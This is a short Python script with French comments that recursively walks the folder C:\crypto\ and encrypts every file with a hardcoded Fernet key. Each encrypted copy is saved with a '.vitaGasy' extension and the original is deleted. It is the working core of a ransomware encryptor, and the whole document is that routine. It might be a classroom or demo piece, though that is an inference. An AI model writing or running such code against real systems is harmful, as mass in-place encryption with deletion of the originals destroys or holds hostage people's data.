

# Importer le module Cryptography
from cryptography.fernet import Fernet 
import os 


# Give here the encryption key
# key = Fernet.generate_key()
# Open the file that contains the key
# f = open("key.key", "wb")
# f.write(key)
# f.close()

# use this key to encrypt/decrypt your all file and folder
# cipher_suite = Fernet(key)
cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')

# Parcourir recursivement chaque dossier et ses sous-dossiers pour trouver des fichiers
for root, dirs, files in os.walk("C:\\crypto\\"):  
    # Pour chaque fichier
	for file in files: 
		# Ignorer les fichiers qui ont deja ete traite
		if file.endswith(".vitaGasy"): 
			# print(file + "already encrypted")
			continue

		# Ouvrir le fichier
		file_path = os.path.join(root, file) 
		with open(file_path, "rb") as f: 
			# Lire le fichier en mode binaire
			data = f.read() 

		# Crypter le fichier
		encrypted_data = cipher_suite.encrypt(data) 

		# ecrire le fichier chiffre
		with open(file_path + ".vitaGasy", "wb") as f: 
			f.write(encrypted_data)
		
		# Supprimer l'original
		os.remove(file_path) 

# NOTE : Bien qu'on ait pu crypter le fichier, ne jamais oublier que quelqu'un,avec la cle, peut dechiffrer les donnees!